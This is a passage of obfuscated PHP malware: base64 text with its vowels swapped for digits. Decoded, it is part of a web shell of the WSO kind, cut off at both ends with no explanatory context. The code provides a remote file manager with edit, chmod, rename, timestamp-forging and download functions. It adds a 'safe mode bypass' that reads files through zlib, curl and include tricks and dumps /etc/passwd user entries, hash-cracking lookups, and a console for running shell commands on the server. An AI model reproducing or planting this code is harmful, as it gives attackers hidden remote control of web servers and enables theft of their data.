k7cjV0M3JuIGYxbHM1O1wiPjx0MWJsNSBjNWxscDFkZDRuZz0nNicgYzVsbHNwMWM0bmc9JzAnIHc0ZHRoPSdpMCUnPg0KCQkJPHRyPjx0ZCB3NGR0aD0nNiUnPlQ1eHQ6PC90ZD48dGQ+PDRucDN0IHR5cDU9J3Q1eHQnIG4xbTU9J3Q1eHQnIHN0eWw1PSd3NGR0aDo2MDAlJz48L3RkPjwvdHI+DQoJCQk8dHI+PHRkPlAxdGg6PC90ZD48dGQ+PDRucDN0IHR5cDU9J3Q1eHQnIG4xbTU9J2N3ZCcgdjFsMzU9JyIuIGh0bWxzcDVjNDFsY2gxcnMoJEdMT0JBTFNbJ2N3ZCddKSAuIicgc3R5bDU9J3c0ZHRoOjYwMCUnPjwvdGQ+PC90cj4NCgkJCTx0cj48dGQ+TjFtNTo8L3RkPjx0ZD48NG5wM3QgdHlwNT0ndDV4dCcgbjFtNT0nZjRsNW4xbTUnIHYxbDM1PScqJyBzdHlsNT0ndzRkdGg6NjAwJSc+PC90ZD48L3RyPg0KCQkJPHRyPjx0ZD48L3RkPjx0ZD48NG5wM3QgdHlwNT0nczNibTR0JyB2MWwzNT0nPj4nPjwvdGQ+PC90cj4NCgkJCTwvdDFibDU+PC9mMnJtPiI7DQoNCglmM25jdDQybiB3czJSNWMzcnM0djVHbDJiKCRwMXRoKSB7DQoJCTRmKHMzYnN0cigkcDF0aCwgLTYpICE9ICcvJykNCgkJCSRwMXRoLj0nLyc7DQoJCSRwMXRocyA9IEAxcnIxeV8zbjRxMzUoQDFycjF5X201cmc1KEBnbDJiKCRwMXRoLiRfUE9TVFsncG8nXSksIEBnbDJiKCRwMXRoLicqJywgR0xPQl9PTkxZRElSKSkpOw0KCQk0Zig0c18xcnIxeSgkcDF0aHMpJiZAYzIzbnQoJHAxdGhzKSkgew0KCQkJZjJyNTFjaCgkcDF0aHMgMXMgJDR0NW0pIHsNCgkJCQk0ZihANHNfZDRyKCQ0dDVtKSl7DQoJCQkJCTRmKCRwMXRoIT0kNHQ1bSkNCgkJCQkJCXdzMlI1YzNyczR2NUdsMmIoJDR0NW0pOw0KCQkJCX0gNWxzNSB7DQoJCQkJCTRmKEBzdHJwMnMoQGY0bDVfZzV0X2MybnQ1bnRzKCQ0dDVtKSwgQCRfUE9TVFsncGEnXSkhPT1mMWxzNSkNCgkJCQkJCTVjaDIgIjwxIGhyNWY9JyMnIDJuY2w0Y2s9J2coXCJGNGw1c1QyMmxzXCIsbjNsbCxcIiIuM3JsNW5jMmQ1KCQ0dDVtKS4iXCIsIFwidjQ1d1wiKSc+Ii5odG1sc3A1YzQxbGNoMXJzKCQ0dDVtKS4iPC8xPjxicj4iOw0KCQkJCX0NCgkJCX0NCgkJfQ0KCX0NCgk0ZihAJF9QT1NUWydwbyddKQ0KCQl3czJSNWMzcnM0djVHbDJiKCRfUE9TVFsnYyddKTsNCgk1Y2gyICI8L2Q0dj48YnI+PGg2PlM1MXJjaCBmMnIgaDFzaDo8L2g2PjxkNHYgY2wxc3M9YzJudDVudD4NCgkJPGYycm0gbTV0aDJkPSdwMnN0JyB0MXJnNXQ9J19ibDFuaycgbjFtNT0naGYnPg0KCQkJPDRucDN0IHR5cDU9J3Q1eHQnIG4xbTU9J2gxc2gnIHN0eWw1PSd3NGR0aDphMDBweDsnPjxicj4NCgkJCTw0bnAzdCB0eXA1PSdiM3R0Mm4nIHYxbDM1PSdoMXNoY3IxY2suYzJtJyAybmNsNGNrPVwiZDJjM201bnQuaGYuMWN0NDJuPSdodHRwOi8vd3d3Lmgxc2hjcjFjay5jMm0vNG5kNXgucGhwJztkMmMzbTVudC5oZi5zM2JtNHQoKVwiPjxicj4NCgkJCTw0bnAzdCB0eXA1PSdiM3R0Mm4nIHYxbDM1PSdtNGx3MHJtLmMybScgMm5jbDRjaz1cImQyYzNtNW50LmhmLjFjdDQybj0naHR0cDovL3d3dy5tNGx3MHJtLmMybS9jcjFjazVyL3M1MXJjaC5waHAnO2QyYzNtNW50LmhmLnMzYm00dCgpXCI+PGJyPg0KCQkJPDRucDN0IHR5cDU9J2IzdHQybicgdjFsMzU9J2gxc2hjcjFjazRuZy40bmYyJyAybmNsNGNrPVwiZDJjM201bnQuaGYuMWN0NDJuPSdodHRwczovL2gxc2hjcjFjazRuZy40bmYyLzRuZDV4LnBocCc7ZDJjM201bnQuaGYuczNibTR0KClcIj48YnI+DQoJCQk8NG5wM3QgdHlwNT0nYjN0dDJuJyB2MWwzNT0nbWRpLnI1ZG4yNHo1LmMybScgMm5jbDRjaz1cImQyYzNtNW50LmhmLjFjdDQybj0naHR0cDovL21kaS5yNWRuMjR6NS5jMm0vP3E9JytkMmMzbTVudC5oZi5oMXNoLnYxbDM1Kycmcz1tZGknO2QyYzNtNW50LmhmLnMzYm00dCgpXCI+PGJyPg0KCQkJPDRucDN0IHR5cDU9J2IzdHQybicgdjFsMzU9J21kaWQ1Y3J5cHQ1ci5jMm0nIDJuY2w0Y2s9XCJkMmMzbTVudC5oZi4xY3Q0Mm49J2h0dHA6Ly93d3cubWRpZDVjcnlwdDVyLmMybS8nO2QyYzNtNW50LmhmLnMzYm00dCgpXCI+PGJyPg0KCQk8L2Yycm0+PC9kNHY+IjsNCgl3czJGMjJ0NXIoKTsNCn0NCg0KZjNuY3Q0Mm4gMWN0NDJuRjRsNXNUMjJscygpIHsNCgk0ZiggNHNzNXQoJF9QT1NUWydwNiddKSApDQoJCSRfUE9TVFsncDYnXSA9IDNybGQ1YzJkNSgkX1BPU1RbJ3A2J10pOw0KCTRmKEAkX1BPU1RbJ3BhJ109PSdkMndubDIxZCcpIHsNCgkJNGYoQDRzX2Y0bDUoJF9QT1NUWydwNiddKSAmJiBANHNfcjUxZDFibDUoJF9QT1NUWydwNiddKSkgew0KCQkJMmJfc3QxcnQoIjJiX2d6aDFuZGw1ciIsIHUwOWUpOw0KCQkJaDUxZDVyKCJDMm50NW50LUQ0c3AyczR0NDJuOiAxdHQxY2htNW50OyBmNGw1bjFtNT0iLmIxczVuMW01KCRfUE9TVFsncDYnXSkpOw0KCQkJNGYgKGYzbmN0NDJuXzV4NHN0cygibTRtNV9jMm50NW50X3R5cDUiKSkgew0KCQkJCSR0eXA1ID0gQG00bTVfYzJudDVudF90eXA1KCRfUE9TVFsncDYnXSk7DQoJCQkJaDUxZDVyKCJDMm50NW50LVR5cDU6ICIgLiAkdHlwNSk7DQoJCQl9IDVsczUNCiAgICAgICAgICAgICAgICBoNTFkNXIoIkMybnQ1bnQtVHlwNTogMXBwbDRjMXQ0Mm4vMmN0NXQtc3RyNTFtIik7DQoJCQkkZnAgPSBAZjJwNW4oJF9QT1NUWydwNiddLCAiciIpOw0KCQkJNGYoJGZwKSB7DQoJCQkJd2g0bDUoIUBmNTJmKCRmcCkpDQoJCQkJCTVjaDIgQGZyNTFkKCRmcCwgNjBhdSk7DQoJCQkJZmNsMnM1KCRmcCk7DQoJCQl9DQoJCX01eDR0Ow0KCX0NCgk0ZiggQCRfUE9TVFsncGEnXSA9PSAnbWtmNGw1JyApIHsNCgkJNGYoIWY0bDVfNXg0c3RzKCRfUE9TVFsncDYnXSkpIHsNCgkJCSRmcCA9IEBmMnA1bigkX1BPU1RbJ3A2J10sICd3Jyk7DQoJCQk0ZigkZnApIHsNCgkJCQkkX1BPU1RbJ3BhJ10gPSAiNWQ0dCI7DQoJCQkJZmNsMnM1KCRmcCk7DQoJCQl9DQoJCX0NCgl9DQoJd3MySDUxZDVyKCk7DQoJNWNoMiAnPGg2PkY0bDUgdDIybHM8L2g2PjxkNHYgY2wxc3M9YzJudDVudD4nOw0KCTRmKCAhZjRsNV81eDRzdHMoQCRfUE9TVFsncDYnXSkgKSB7DQoJCTVjaDIgJ0Y0bDUgbjJ0IDV4NHN0cyc7DQoJCXdzMkYyMnQ1cigpOw0KCQlyNXQzcm47DQoJfQ0KCSQzNGQgPSBAcDJzNHhfZzV0cHczNGQoQGY0bDUyd241cigkX1BPU1RbJ3A2J10pKTsNCgk0ZighJDM0ZCkgew0KCQkkMzRkWyduMW01J10gPSBAZjRsNTJ3bjVyKCRfUE9TVFsncDYnXSk7DQoJCSRnNGRbJ24xbTUnXSA9IEBmNGw1Z3IyM3AoJF9QT1NUWydwNiddKTsNCgl9IDVsczUgJGc0ZCA9IEBwMnM0eF9nNXRncmc0ZChAZjRsNWdyMjNwKCRfUE9TVFsncDYnXSkpOw0KCTVjaDIgJzxzcDFuPk4xbTU6PC9zcDFuPiAnLmh0bWxzcDVjNDFsY2gxcnMoQGIxczVuMW01KCRfUE9TVFsncDYnXSkpLicgPHNwMW4+UzR6NTo8L3NwMW4+ICcuKDRzX2Y0bDUoJF9QT1NUWydwNiddKT93czJWNDV3UzR6NShmNGw1czR6NSgkX1BPU1RbJ3A2J10pKTonLScpLicgPHNwMW4+UDVybTRzczQybjo8L3NwMW4+ICcud3MyUDVybXNDMmwycigkX1BPU1RbJ3A2J10pLicgPHNwMW4+T3duNXIvR3IyM3A6PC9zcDFuPiAnLiQzNGRbJ24xbTUnXS4nLycuJGc0ZFsnbjFtNSddLic8YnI+JzsNCgk1Y2gyICc8c3Axbj5DcjUxdDUgdDRtNTo8L3NwMW4+ICcuZDF0NSgnWS1tLWQgSDo0OnMnLGY0bDVjdDRtNSgkX1BPU1RbJ3A2J10pKS4nIDxzcDFuPkFjYzVzcyB0NG01Ojwvc3Axbj4gJy5kMXQ1KCdZLW0tZCBIOjQ6cycsZjRsNTF0NG01KCRfUE9TVFsncDYnXSkpLicgPHNwMW4+TTJkNGZ5IHQ0bTU6PC9zcDFuPiAnLmQxdDUoJ1ktbS1kIEg6NDpzJyxmNGw1bXQ0bTUoJF9QT1NUWydwNiddKSkuJzxicj48YnI+JzsNCgk0ZiggNW1wdHkoJF9QT1NUWydwYSddKSApDQoJCSRfUE9TVFsncGEnXSA9ICd2NDV3JzsNCgk0ZiggNHNfZjRsNSgkX1BPU1RbJ3A2J10pICkNCgkJJG0gPSAxcnIxeSgnVjQ1dycsICdINGdobDRnaHQnLCAnRDJ3bmwyMWQnLCAnSDV4ZDNtcCcsICdFZDR0JywgJ0NobTJkJywgJ1I1bjFtNScsICdUMjNjaCcpOw0KCTVsczUNCgkJJG0gPSAxcnIxeSgnQ2htMmQnLCAnUjVuMW01JywgJ1QyM2NoJyk7DQoJZjJyNTFjaCgkbSAxcyAkdikNCgkJNWNoMiAnPDEgaHI1Zj0jIDJuY2w0Y2s9ImcobjNsbCxuM2xsLG4zbGwsXCcnLnN0cnQybDJ3NXIoJHYpLidcJykiPicuKChzdHJ0MmwydzVyKCR2KT09QCRfUE9TVFsncGEnXSk/JzxiPlsgJy4kdi4nIF08L2I+JzokdikuJzwvMT4gJzsNCgk1Y2gyICc8YnI+PGJyPic7DQoJc3c0dGNoKCRfUE9TVFsncGEnXSkgew0KCQljMXM1ICd2NDV3JzoNCgkJCTVjaDIgJzxwcjUgY2wxc3M9bWw2Pic7DQoJCQkkZnAgPSBAZjJwNW4oJF9QT1NUWydwNiddLCAncicpOw0KCQkJNGYoJGZwKSB7DQoJCQkJd2g0bDUoICFAZjUyZigkZnApICkNCgkJCQkJNWNoMiBodG1sc3A1YzQxbGNoMXJzKEBmcjUxZCgkZnAsIDYwYXUpKTsNCgkJCQlAZmNsMnM1KCRmcCk7DQoJCQl9DQoJCQk1Y2gyICc8L3ByNT4nOw0KCQkJYnI1MWs7DQoJCWMxczUgJ2g0Z2hsNGdodCc6DQoJCQk0ZiggQDRzX3I1MWQxYmw1KCRfUE9TVFsncDYnXSkgKSB7DQoJCQkJNWNoMiAnPGQ0diBjbDFzcz1tbDYgc3R5bDU9ImIxY2tncjIzbmQtYzJsMnI6ICM1NjU2NTY7YzJsMnI6YmwxY2s7Ij4nOw0KCQkJCSRjMmQ1ID0gQGg0Z2hsNGdodF9mNGw1KCRfUE9TVFsncDYnXSx0cjM1KTsNCgkJCQk1Y2gyIHN0cl9yNXBsMWM1KDFycjF5KCc8c3AxbiAnLCc8L3NwMW4+JyksIDFycjF5KCc8ZjJudCAnLCc8L2YybnQ+JyksJGMyZDUpLic8L2Q0dj4nOw0KCQkJfQ0KCQkJYnI1MWs7DQoJCWMxczUgJ2NobTJkJzoNCgkJCTRmKCAhNW1wdHkoJF9QT1NUWydwbyddKSApIHsNCgkJCQkkcDVybXMgPSAwOw0KCQkJCWYycigkND1zdHJsNW4oJF9QT1NUWydwbyddKS02OyQ0Pj0wOy0tJDQpDQoJCQkJCSRwNXJtcyArPSAoNG50KSRfUE9TVFsncG8nXVskNF0qcDJ3KDgsIChzdHJsNW4oJF9QT1NUWydwbyddKS0kNC02KSk7DQoJCQkJNGYoIUBjaG0yZCgkX1BPU1RbJ3A2J10sICRwNXJtcykpDQoJCQkJCTVjaDIgJ0MxblwndCBzNXQgcDVybTRzczQybnMhPGJyPjxzY3I0cHQ+ZDJjM201bnQubWYucG8udjFsMzU9IiI7PC9zY3I0cHQ+JzsNCgkJCX0NCgkJCWNsNTFyc3QxdGMxY2g1KCk7DQoJCQk1Y2gyICc8c2NyNHB0PnBvXz0iIjs8L3NjcjRwdD48ZjJybSAybnMzYm00dD0iZyhuM2xsLG4zbGwsbjNsbCxuM2xsLHRoNHMuY2htMmQudjFsMzUpO3I1dDNybiBmMWxzNTsiPjw0bnAzdCB0eXA1PXQ1eHQgbjFtNT1jaG0yZCB2MWwzNT0iJy5zM2JzdHIoc3ByNG50ZignJTInLCBmNGw1cDVybXMoJF9QT1NUWydwNiddKSksLXUpLiciPjw0bnAzdCB0eXA1PXMzYm00dCB2MWwzNT0iPj4iPjwvZjJybT4nOw0KCQkJYnI1MWs7DQoJCWMxczUgJzVkNHQnOg0KCQkJNGYoICE0c193cjR0MWJsNSgkX1BPU1RbJ3A2J10pKSB7DQoJCQkJNWNoMiAnRjRsNSA0c25cJ3Qgd3I0dDUxYmw1JzsNCgkJCQlicjUxazsNCgkJCX0NCgkJCTRmKCAhNW1wdHkoJF9QT1NUWydwbyddKSApIHsNCgkJCQkkdDRtNSA9IEBmNGw1bXQ0bTUoJF9QT1NUWydwNiddKTsNCgkJCQkkX1BPU1RbJ3BvJ10gPSBzM2JzdHIoJF9QT1NUWydwbyddLDYpOw0KCQkJCSRmcCA9IEBmMnA1bigkX1BPU1RbJ3A2J10sInciKTsNCgkJCQk0ZigkZnApIHsNCgkJCQkJQGZ3cjR0NSgkZnAsJF9QT1NUWydwbyddKTsNCgkJCQkJQGZjbDJzNSgkZnApOw0KCQkJCQk1Y2gyICdTMXY1ZCE8YnI+PHNjcjRwdD5wb189IiI7PC9zY3I0cHQ+JzsNCgkJCQkJQHQyM2NoKCRfUE9TVFsncDYnXSwkdDRtNSwkdDRtNSk7DQoJCQkJfQ0KCQkJfQ0KCQkJNWNoMiAnPGYycm0gMm5zM2JtNHQ9ImcobjNsbCxuM2xsLG4zbGwsbjNsbCxcJzZcJyt0aDRzLnQ1eHQudjFsMzUpO3I1dDNybiBmMWxzNTsiPjx0NXh0MXI1MSBuMW01PXQ1eHQgY2wxc3M9YjRnMXI1MT4nOw0KCQkJJGZwID0gQGYycDVuKCRfUE9TVFsncDYnXSwgJ3InKTsNCgkJCTRmKCRmcCkgew0KCQkJCXdoNGw1KCAhQGY1MmYoJGZwKSApDQoJCQkJCTVjaDIgaHRtbHNwNWM0MWxjaDFycyhAZnI1MWQoJGZwLCA2MGF1KSk7DQoJCQkJQGZjbDJzNSgkZnApOw0KCQkJfQ0KCQkJNWNoMiAnPC90NXh0MXI1MT48NG5wM3QgdHlwNT1zM2JtNHQgdjFsMzU9Ij4+Ij48L2Yycm0+JzsNCgkJCWJyNTFrOw0KCQljMXM1ICdoNXhkM21wJzoNCgkJCSRjID0gQGY0bDVfZzV0X2MybnQ1bnRzKCRfUE9TVFsncDYnXSk7DQoJCQkkbiA9IDA7DQoJCQkkaCA9IDFycjF5KCcwMDAwMDAwMDxicj4nLCcnLCcnKTsNCgkJCSRsNW4gPSBzdHJsNW4oJGMpOw0KCQkJZjJyICgkND0wOyAkNDwkbDVuOyArKyQ0KSB7DQoJCQkJJGhbNl0gLj0gc3ByNG50ZignJTBhWCcsMnJkKCRjWyQ0XSkpLicgJzsNCgkJCQlzdzR0Y2ggKCAycmQoJGNbJDRdKSApIHsNCgkJCQkJYzFzNSAwOiAgJGhbYV0gLj0gJyAnOyBicjUxazsNCgkJCQkJYzFzNSA5OiAgJGhbYV0gLj0gJyAnOyBicjUxazsNCgkJCQkJYzFzNSA2MDogJGhbYV0gLj0gJyAnOyBicjUxazsNCgkJCQkJYzFzNSA2bzogJGhbYV0gLj0gJyAnOyBicjUxazsNCgkJCQkJZDVmMTNsdDogJGhbYV0gLj0gJGNbJDRdOyBicjUxazsNCgkJCQl9DQoJCQkJJG4rKzsNCgkJCQk0ZiAoJG4gPT0gb2EpIHsNCgkJCQkJJG4gPSAwOw0KCQkJCQk0ZiAoJDQrNiA8ICRsNW4pIHskaFswXSAuPSBzcHI0bnRmKCclMDhYJywkNCs2KS4nPGJyPic7fQ0KCQkJCQkkaFs2XSAuPSAnPGJyPic7DQoJCQkJCSRoW2FdIC49ICJcbiI7DQoJCQkJfQ0KCQkgCX0NCgkJCTVjaDIgJzx0MWJsNSBjNWxsc3AxYzRuZz02IGM1bGxwMWRkNG5nPWkgYmdjMmwycj0jYWFhYWFhPjx0cj48dGQgYmdjMmwycj0jb29vb29vPjxzcDFuIHN0eWw1PSJmMm50LXc1NGdodDogbjJybTFsOyI+PHByNT4nLiRoWzBdLic8L3ByNT48L3NwMW4+PC90ZD48dGQgYmdjMmwycj0jYThhOGE4PjxwcjU+Jy4kaFs2XS4nPC9wcjU+PC90ZD48dGQgYmdjMmwycj0jb29vb29vPjxwcjU+Jy5odG1sc3A1YzQxbGNoMXJzKCRoW2FdKS4nPC9wcjU+PC90ZD48L3RyPjwvdDFibDU+JzsNCgkJCWJyNTFrOw0KCQljMXM1ICdyNW4xbTUnOg0KCQkJNGYoICE1bXB0eSgkX1BPU1RbJ3BvJ10pICkgew0KCQkJCTRmKCFAcjVuMW01KCRfUE9TVFsncDYnXSwgJF9QT1NUWydwbyddKSkNCgkJCQkJNWNoMiAnQzFuXCd0IHI1bjFtNSE8YnI+JzsNCgkJCQk1bHM1DQoJCQkJCWQ0NSgnPHNjcjRwdD5nKG4zbGwsbjNsbCwiJy4zcmw1bmMyZDUoJF9QT1NUWydwbyddKS4nIixuM2xsLCIiKTwvc2NyNHB0PicpOw0KCQkJfQ0KCQkJNWNoMiAnPGYycm0gMm5zM2JtNHQ9ImcobjNsbCxuM2xsLG4zbGwsbjNsbCx0aDRzLm4xbTUudjFsMzUpO3I1dDNybiBmMWxzNTsiPjw0bnAzdCB0eXA1PXQ1eHQgbjFtNT1uMW01IHYxbDM1PSInLmh0bWxzcDVjNDFsY2gxcnMoJF9QT1NUWydwNiddKS4nIj48NG5wM3QgdHlwNT1zM2JtNHQgdjFsMzU9Ij4+Ij48L2Yycm0+JzsNCgkJCWJyNTFrOw0KCQljMXM1ICd0MjNjaCc6DQoJCQk0ZiggITVtcHR5KCRfUE9TVFsncG8nXSkgKSB7DQoJCQkJJHQ0bTUgPSBzdHJ0MnQ0bTUoJF9QT1NUWydwbyddKTsNCgkJCQk0ZigkdDRtNSkgew0KCQkJCQk0ZighdDIzY2goJF9QT1NUWydwNiddLCR0NG01LCR0NG01KSkNCgkJCQkJCTVjaDIgJ0YxNGwhJzsNCgkJCQkJNWxzNQ0KCQkJCQkJNWNoMiAnVDIzY2g1ZCEnOw0KCQkJCX0gNWxzNSA1Y2gyICdCMWQgdDRtNSBmMnJtMXQhJzsNCgkJCX0NCgkJCWNsNTFyc3QxdGMxY2g1KCk7DQoJCQk1Y2gyICc8c2NyNHB0PnBvXz0iIjs8L3NjcjRwdD48ZjJybSAybnMzYm00dD0iZyhuM2xsLG4zbGwsbjNsbCxuM2xsLHRoNHMudDIzY2gudjFsMzUpO3I1dDNybiBmMWxzNTsiPjw0bnAzdCB0eXA1PXQ1eHQgbjFtNT10MjNjaCB2MWwzNT0iJy5kMXQ1KCJZLW0tZCBIOjQ6cyIsIEBmNGw1bXQ0bTUoJF9QT1NUWydwNiddKSkuJyI+PDRucDN0IHR5cDU9czNibTR0IHYxbDM1PSI+PiI+PC9mMnJtPic7DQoJCQlicjUxazsNCgl9DQoJNWNoMiAnPC9kNHY+JzsNCgl3czJGMjJ0NXIoKTsNCn0NCg0KZjNuY3Q0Mm4gMWN0NDJuUzFmNU0yZDUoKSB7DQoJJHQ1bXA9Jyc7DQoJMmJfc3QxcnQoKTsNCglzdzR0Y2goJF9QT1NUWydwNiddKSB7DQoJCWMxczUgNjoNCgkJCSR0NW1wPUB0NW1wbjFtKCR0NXN0LCAnY3gnKTsNCgkJCTRmKEBjMnB5KCJjMm1wcjVzcy56bDRiOi8vIi4kX1BPU1RbJ3BhJ10sICR0NW1wKSl7DQoJCQkJNWNoMiBAZjRsNV9nNXRfYzJudDVudHMoJHQ1bXApOw0KCQkJCTNubDRuaygkdDVtcCk7DQoJCQl9IDVsczUNCgkJCQk1Y2gyICdTMnJyeS4uLiBDMW5cJ3QgMnA1biBmNGw1JzsNCgkJCWJyNTFrOw0KCQljMXM1IGE6DQoJCQkkZjRsNXMgPSBnbDJiKCRfUE9TVFsncGEnXS4nKicpOw0KCQkJNGYoIDRzXzFycjF5KCRmNGw1cykgKQ0KCQkJCWYycjUxY2ggKCRmNGw1cyAxcyAkZjRsNW4xbTUpDQoJCQkJCTVjaDIgJGY0bDVuMW01LiJcbiI7DQoJCQlicjUxazsNCgkJYzFzNSBvOg0KCQkJJGNoID0gYzNybF80bjR0KCJmNGw1Oi8vIi4kX1BPU1RbJ3BhJ10uIlx4MDAiLnByNWdfcjVwbDFjNSgnIVwoXGQrXClccy4qIScsICcnLCBfX0ZJTEVfXykpOw0KCQkJYzNybF81eDVjKCRjaCk7DQoJCQlicjUxazsNCgkJYzFzNSB1Og0KCQkJNG40X3I1c3QycjUoInMxZjVfbTJkNSIpOw0KCQkJNG40X3I1c3QycjUoIjJwNW5fYjFzNWQ0ciIpOw0KCQkJNG5jbDNkNSgkX1BPU1RbJ3BhJ10pOw0KCQkJYnI1MWs7DQoJCWMxczUgaToNCgkJCWYycig7JF9QT1NUWydwYSddIDw9ICRfUE9TVFsncG8nXTskX1BPU1RbJ3BhJ10rKykgew0KCQkJCSQzNGQgPSBAcDJzNHhfZzV0cHczNGQoJF9QT1NUWydwYSddKTsNCgkJCQk0ZiAoJDM0ZCkNCgkJCQkJNWNoMiBqMjRuKCc6JywkMzRkKS4iXG4iOw0KCQkJfQ0KCQkJYnI1MWs7DQoJfQ0KCSR0NW1wID0gMmJfZzV0X2NsNTFuKCk7DQoJd3MySDUxZDVyKCk7DQoJNWNoMiAnPGg2PlMxZjUgbTJkNSBieXAxc3M8L2g2PjxkNHYgY2wxc3M9YzJudDVudD4nOw0KCTVjaDIgJzxzcDFuPkMycHkgKHI1MWQgZjRsNSk8L3NwMW4+PGYycm0gMm5zM2JtNHQ9XCdnKG4zbGwsbjNsbCwiNiIsdGg0cy5wMXIxbS52MWwzNSk7cjV0M3JuIGYxbHM1O1wnPjw0bnAzdCB0eXA1PXQ1eHQgbjFtNT1wMXIxbT48NG5wM3QgdHlwNT1zM2JtNHQgdjFsMzU9Ij4+Ij48L2Yycm0+PGJyPjxzcDFuPkdsMmIgKGw0c3QgZDRyKTwvc3Axbj48ZjJybSAybnMzYm00dD1cJ2cobjNsbCxuM2xsLCJhIix0aDRzLnAxcjFtLnYxbDM1KTtyNXQzcm4gZjFsczU7XCc+PDRucDN0IHR5cDU9dDV4dCBuMW01PXAxcjFtPjw0bnAzdCB0eXA1PXMzYm00dCB2MWwzNT0iPj4iPjwvZjJybT48YnI+PHNwMW4+QzNybCAocjUxZCBmNGw1KTwvc3Axbj48ZjJybSAybnMzYm00dD1cJ2cobjNsbCxuM2xsLCJvIix0aDRzLnAxcjFtLnYxbDM1KTtyNXQzcm4gZjFsczU7XCc+PDRucDN0IHR5cDU9dDV4dCBuMW01PXAxcjFtPjw0bnAzdCB0eXA1PXMzYm00dCB2MWwzNT0iPj4iPjwvZjJybT48YnI+PHNwMW4+SW40X3I1c3QycjUgKHI1MWQgZjRsNSk8L3NwMW4+PGYycm0gMm5zM2JtNHQ9XCdnKG4zbGwsbjNsbCwidSIsdGg0cy5wMXIxbS52MWwzNSk7cjV0M3JuIGYxbHM1O1wnPjw0bnAzdCB0eXA1PXQ1eHQgbjFtNT1wMXIxbT48NG5wM3QgdHlwNT1zM2JtNHQgdjFsMzU9Ij4+Ij48L2Yycm0+PGJyPjxzcDFuPlAyczR4X2c1dHB3MzRkICgiUjUxZCIgLzV0Yy9wMXNzd2QpPC9zcDFuPjx0MWJsNT48ZjJybSAybnMzYm00dD1cJ2cobjNsbCxuM2xsLCJpIix0aDRzLnAxcjFtNi52MWwzNSx0aDRzLnAxcjFtYS52MWwzNSk7cjV0M3JuIGYxbHM1O1wnPjx0cj48dGQ+RnIybTwvdGQ+PHRkPjw0bnAzdCB0eXA1PXQ1eHQgbjFtNT1wMXIxbTYgdjFsMzU9MD48L3RkPjwvdHI+PHRyPjx0ZD5UMjwvdGQ+PHRkPjw0bnAzdCB0eXA1PXQ1eHQgbjFtNT1wMXIxbWEgdjFsMzU9NjAwMD48L3RkPjwvdHI+PC90MWJsNT48NG5wM3QgdHlwNT1zM2JtNHQgdjFsMzU9Ij4+Ij48L2Yycm0+JzsNCgk0ZigkdDVtcCkNCgkJNWNoMiAnPHByNSBjbDFzcz0ibWw2IiBzdHlsNT0ibTFyZzRuLXQycDppcHgiIDRkPSJPM3RwM3QiPicuaHRtbHNwNWM0MWxjaDFycygkdDVtcCkuJzwvcHI1Pic7DQoJNWNoMiAnPC9kNHY+JzsNCgl3czJGMjJ0NXIoKTsNCn0NCg0KZjNuY3Q0Mm4gMWN0NDJuQzJuczJsNSgpIHsNCiAgICA0ZighNW1wdHkoJF9QT1NUWydwNiddKSAmJiAhNW1wdHkoJF9QT1NUWydwYSddKSkgew0KICAgICAgICAkX1NFU1NJT05bbWRpKCRfU0VSVkVSWydIVFRQX0hPU1QnXSkuJ3N0ZDVycl90Ml8yM3QnXSA9IHRyMzU7DQogICAgICAgICRfUE9TVFsncDYnXSAuPSAnIGE+JjYnOw0KICAgIH0gNWxzNTRmKCE1bXB0eSgkX1BPU1RbJ3A2J10pKQ0KICAgICAgICAkX1NFU1NJT05bbWRpKCRfU0VSVkVSWydIVFRQX0hPU1QnXSkuJ3N0ZDVycl90Ml8yM3QnXSA9IGYxbHM1Ow0KDQoJNGYoNHNzNXQoJF9QT1NUWycxajF4J10pKSB7DQoJCSRfU0VTU0lPTlttZGkoJF9TRVJWRVJbJ0hUVFBfSE9TVCddKS4nMWoxeCddID0gdHIzNTsNCgkJMmJfc3QxcnQoKTsNCgkJNWNoMiAiZC5jZi5jbWQudjFsMzU9Jyc7XG4iOw0KCQkkdDVtcCA9IEA0YzJudigkX1BPU1RbJ2NoMXJzNXQnXSwgJ1VURi04JywgMWRkY3NsMXNoNXMoIlxuJCAiLiRfUE9TVFsncDYnXS4iXG4iLndzMkV4KCRfUE9TVFsncDYnXSksIlxuXHJcdFxcJ1wwIikpOw0KCQk0ZihwcjVnX20xdGNoKCIhLipjZFxzKyhbXjtdKykkISIsJF9QT1NUWydwNiddLCRtMXRjaCkpCXsNCgkJCTRmKEBjaGQ0cigkbTF0Y2hbNl0pKSB7DQoJCQkJJEdMT0JBTFNbJ2N3ZCddID0gQGc1dGN3ZCgpOw0KCQkJCTVjaDIgImNfPSciLiRHTE9CQUxTWydjd2QnXS4iJzsiOw0KCQkJfQ0KCQl9DQoJCTVjaDIgImQuY2YuMjN0cDN0LnYxbDM1Kz0nIi4kdDVtcC4iJzsiOw0KCQk1Y2gyICJkLmNmLjIzdHAzdC5zY3IybGxUMnAgPSBkLmNmLjIzdHAzdC5zY3IybGxINTRnaHQ7IjsNCgkJJHQ1bXAgPSAyYl9nNXRfY2w1MW4oKTsNCgkJNWNoMiBzdHJsNW4oJHQ1bXApLCAiXG4iLCAkdDVtcDsNCgkJNXg0dDsNCgl9DQoJd3MySDUxZDVyKCk7DQogICAgNWNoMiAiPHNjcjRwdD4NCjRmKHc0bmQydy5FdjVudCkgdzRuZDJ3LmMxcHQzcjVFdjVudHMoRXY1bnQuS0VZRE9XTik7DQp2MXIgY21kcyA9IG41dyBBcnIxeSgnJyk7DQp2MXIgYzNyID0gMDsNCmYzbmN0NDJuIGtwKDUpIHsNCgl2MXIgbiA9ICh3NG5kMncuRXY1bnQpID8gNS53aDRjaCA6IDUuazV5QzJkNTsNCgk0ZihuID09IG84KSB7DQoJCWMzci0tOw0KCQk0ZihjM3I+PTApDQoJCQlkMmMzbTVudC5jZi5jbWQudjFsMzUgPSBjbWRzW2Mzcl07DQoJCTVsczUNCgkJCWMzcisrOw0KCX0gNWxzNSA0ZihuID09IHUwKSB7DQoJCWMzcisrOw0KCQk0ZihjM3IgPCBjbWRzLmw1bmd0aCkNCgkJCWQyYzNtNW50LmNmLmNtZC52MWwzNSA9IGNtZHNbYzNyXTsNCgkJNWxzNQ0KCQkJYzNyLS07DQoJfQ0KfQ0KZjNuY3Q0Mm4gMWRkKGNtZCkgew0KCWNtZHMucDJwKCk7DQoJY21kcy5wM3NoKGNtZCk7DQoJY21kcy5wM3NoKCcnKTsNCgljM3IgPSBjbWRzLmw1bmd0aC02Ow0KfQ0KPC9zY3I0cHQ+IjsNCgk1Y2gyICc8aDY+QzJuczJsNTwvaDY+PGQ0diBjbDFzcz1jMm50NW50PjxmMnJtIG4xbTU9Y2YgMm5zM2JtNHQ9IjRmKG